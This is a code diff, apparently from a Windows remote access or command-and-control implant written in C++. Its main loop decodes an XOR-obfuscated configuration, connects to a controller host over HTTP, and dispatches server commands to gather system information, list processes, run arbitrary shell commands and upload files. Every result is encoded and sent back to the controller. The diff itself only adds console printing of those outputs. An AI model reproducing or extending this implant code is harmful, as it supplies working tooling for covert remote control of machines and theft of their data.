@@ -6,7 +6,7 @@ void mainloop() {
 	c.endpoints = e;
 	std::string res = xorConfig((char*)CONFIG_BUFFER);
 	initializeConfig(&c, res.c_str());
-	std::cout << c.hostname;
+	std::cout << c.hostname << "\n";
 
 	HANDLE hInternet = InternetOpenA(c.hostname.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
 	HANDLE hConnect = InternetConnectA(hInternet, c.hostname.c_str(), c.port, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
@@ -20,6 +20,7 @@ void mainloop() {
 
 		//Process request here. If first part of string is a 1, do this... 2 do this... etc.
 		std::string code = response.substr(0, response.find(" "));
+		std::string outString;
 		size_t first;
 		size_t second;
 		switch (atoi(code.c_str())) {
@@ -28,15 +29,21 @@ void mainloop() {
 			break;
 		case 2:
 			//INFO
-			sendEncodedString(&c.strings, c.key, gatherInfo(&c.strings, hInternet), c.endpoints.info, hConnect);
+			outString = gatherInfo(&c.strings, hInternet);
+			std::cout << outString << "\n";
+			sendEncodedString(&c.strings, c.key, outString, c.endpoints.info, hConnect);
 			break;
 		case 3:
 			//PS
-			sendEncodedString(&c.strings, c.key, getProcToStr(), c.endpoints.ps, hConnect);
+			outString = getProcToStr();
+			std::cout << outString << "\n";
+			sendEncodedString(&c.strings, c.key, outString, c.endpoints.ps, hConnect);
 			break;
 		case 4:
 			//RUN
-			sendEncodedString(&c.strings, c.key, execCmd(&c.strings, response.substr(response.find(" ") + 1), c.cmdtimeout), c.endpoints.out, hConnect);
+			outString = execCmd(&c.strings, response.substr(response.find(" ") + 1), c.cmdtimeout);
+			std::cout << outString << "\n";
+			sendEncodedString(&c.strings, c.key, outString, c.endpoints.out, hConnect);
 			break;
 		case 5:
 			//UPLOAD
